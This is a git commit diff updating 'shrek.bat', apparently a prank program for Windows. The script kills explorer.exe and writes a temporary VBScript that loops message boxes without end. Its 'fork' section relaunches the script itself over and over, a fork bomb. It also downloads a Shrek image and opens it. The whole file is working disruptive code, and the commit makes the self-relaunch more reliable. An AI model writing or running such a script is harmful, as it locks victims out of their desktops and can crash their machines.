14eede1c827196425b5e4c37703ad18b85a4c2ae
Neo Rafajlovic <97417002+NeoRafajlovic@users.noreply.github.com>
2026-04-12 19:16:32 -0400

    Update shrek.bat

--- shrek.bat
+++ shrek.bat
@@ -11,7 +11,9 @@ if "%2"=="fork" goto fork
 
 :setup
 
-start "" /min powershell -command "(new-object -com shell.application).minimizeall()"
+powershell -command "(new-object -com shell.application).minimizeall()"
+
+timeout /t 1 /nobreak >nul
 
 taskkill /F /im explorer.exe >nul
 
@@ -23,21 +25,20 @@ set "file=%temp%\shrek_popup.vbs"
 
 > "%file%" echo Set objShell = WScript.CreateObject("WScript.Shell")
 >>"%file%" echo MsgBox "You have been shreked :("
->>"%file%" echo objShell.Run "start """" /min """ ^& WScript.Arguments(0) ^& """ min fork"
+>>"%file%" echo objShell.Run "cmd /c start """" /min ""%~f0"" min fork", 0, False
 >>"%file%" echo Do
 >>"%file%" echo MsgBox "Oh no!"
 >>"%file%" echo Loop
 
-start "" /max "https://i.pinimg.com/736x/75/6b/bb/756bbb4328e246e8608500ace5d9af0d.jpg"
+curl -L "https://i.pinimg.com/736x/75/6b/bb/756bbb4328e246e8608500ace5d9af0d.jpg" -o "%temp%\shrek.jpg"
+start "" /max mspaint "%temp%\shrek.jpg"
 
 timeout /t 1 /nobreak >nul
-start "" "%temp%\shrek_popup.vbs" "%~f0"
+start "" "%temp%\shrek_popup.vbs"
 
 exit
 
 :fork
-
-timeout /t 1 /nobreak >nul
 
 start "" /min "%~f0" min fork
 
